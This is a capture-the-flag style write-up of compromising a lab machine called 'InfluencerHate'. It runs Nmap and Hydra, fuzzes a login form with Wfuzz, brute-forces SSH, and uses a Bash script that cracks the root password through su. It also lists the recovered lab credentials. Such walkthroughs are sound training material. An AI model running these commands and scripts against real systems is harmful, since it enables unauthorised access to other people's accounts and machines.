# InfluencerHate

## Port Enumeration
We began by scanning the target with Nmap during the discovery phase. The following open port was identified:

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```ruby
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOiDMcTZdMv54RYo66Vj1lo0DHXGzARy5cb26KgkubJZrBqOpV/mZ377CY8BcTi2CLeR0saiWSVFKfbttcqqI9s=
|   256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfU3b71so+RowXPc325dWRWr510sPJQeMOdG+i3QEiC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-title: 401 Unauthorized

```

Two open services were detected:

Port 22 (SSH) – Running OpenSSH 9.2p1 (no immediate vulnerabilities without valid credentials).
Port 80 (HTTP) – Running Apache 2.4.62, protected by HTTP Basic Authentication.

## Brute Force Attack (HTTP Basic Authentication)

The HTTP service required Basic Authentication, so we attempted a brute force attack using Hydra with default credential lists.


```shell
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 -s 80 http-get /
```

[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin

Valid credentials obtained:
Username: httpadmin
Password: fhttpadmin
After logging in with these credentials, we were presented with the Apache default page.

## Directory Fuzzing

We performed directory fuzzing to enumerate additional content. Using Wfuzz, we discovered a secondary login page:

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z list,php,txt,html --hc 401,403,404 --basic httpadmin:fhttpadmin http://172.17.0.2/FUZZ.FUZ2Z
```

This revealed a login form at /login.php. Capturing and analyzing the HTTP request with BurpSuite gave the following structure:

```shell
POST /login.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 33
Cache-Control: max-age=0
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
Upgrade-Insecure-Requests: 1
Origin: http://172.17.0.2
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.17.0.2/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
username=pepe&password=pepe
```

We fuzzed the login form with Wfuzz, targeting the password parameter:

```shell
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt -t 50 --hh=2848 -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" http://172.17.0.2/login.php

/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/login.php
Total requests: 14344392

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                       
=====================================================================

000000027:   200        84 L     236 W      2924 Ch     "chocolate" 
```

New valid credentials obtained:

Username: admin

Password: chocolate

Inside the application we also identified the presence of a possible system user: `balutin`.

![alt text](/Imagenes/InfluencerHate.png)



## SSH Brute Force

We attempted to brute force the SSH service using the discovered username:

```shell
hydra -l balutin -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
```


```shell

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-18 07:41:27
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 14344319 to do in 2988:24h, 4 active
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella

```

Valid SSH credentials:
Username: balutin
Password: estrella

## Privilege Escalation
### Tool Transfer

We transferred the rockyou.txt wordlist to the compromised system for local brute force testing:
```shell
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
```

### Local Brute Force (root via su)
We created a custom Bash script to brute force the su command locally

```shell
#!/bin/bash
echo "[*] Starting brute force against 'su' with rockyou.txt"

counter=0
while IFS= read -r password; do
    counter=$((counter + 1))

    # Show progress every 1000 attempts
    if [ $((counter % 1000)) -eq 0 ]; then
        echo "[*] Attempts: $counter"
    fi

    # Test the password
    echo "$password" | timeout 2 su -c 'echo SUCCESS' 2>/dev/null | grep -q "SUCCESS"
    if [ $? -eq 0 ]; then
        echo "[+] ROOT PASSWORD FOUND: $password"
        echo "[+] Attempts: $counter"
        exit 0
    fi
done < rockyou.txt

echo "[-] Brute force complete. No password found."

```

## Full System Compromise

The local brute force attack succeeded, revealing the root password and allowing full administrative access to the system.
